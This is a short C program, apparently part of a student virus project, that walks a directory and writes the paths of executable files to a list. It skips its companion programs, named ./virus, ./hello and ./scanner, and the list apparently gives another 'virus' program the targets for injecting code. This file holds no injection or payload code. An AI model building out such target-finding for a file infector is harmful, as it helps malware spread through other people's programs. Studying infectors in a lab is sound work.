/*

Author: Pallavi
Created on: 19th January 2017
Modified on:

*/

#include <ftw.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

// to avoid following files while listing all the
// binary files present in the current directory
#define SOURCE_TO_INJECT_CODE "./virus" 
#define VIRUS_CODE "./hello"
#define SCANNER_CODE "./scanner"
#define LIST_BINARY "./createsBinaryFilesList"

// File to contain list of binary files
static FILE* inFp;

// Creates list of binary files except ./virus and ./hello
// ./scanner and ./createsBinaryFilesList in the current directory
int list(const char *name, const struct stat *status, int type);

int main(int argc, char *argv[]) {
	inFp = fopen("./binaryFileList.txt", "w");
	if(inFp == NULL){
		perror("File cant be opened");
		return EXIT_FAILURE;
	}
	if(argc == 1)
		ftw(".", list, 1);
	else
		ftw(argv[1], list, 1);
	fclose(inFp);
	return 0;
}

int list(const char *name, const struct stat *status, int type) {
	if(type == FTW_NS)
		return 0;
	if(type == FTW_F){
		if(status->st_mode & 0111){
			if(strncmp(name,SOURCE_TO_INJECT_CODE,strlen(name))!=0 && 
				(strncmp(name,VIRUS_CODE,strlen(name)) != 0) &&
				(strncmp(name,SCANNER_CODE,strlen(name))!= 0) &&
				(strncmp(name,LIST_BINARY,strlen(name))!= 0))
					fprintf(inFp,"%s\n",name);
		}
	}
	return 0;
}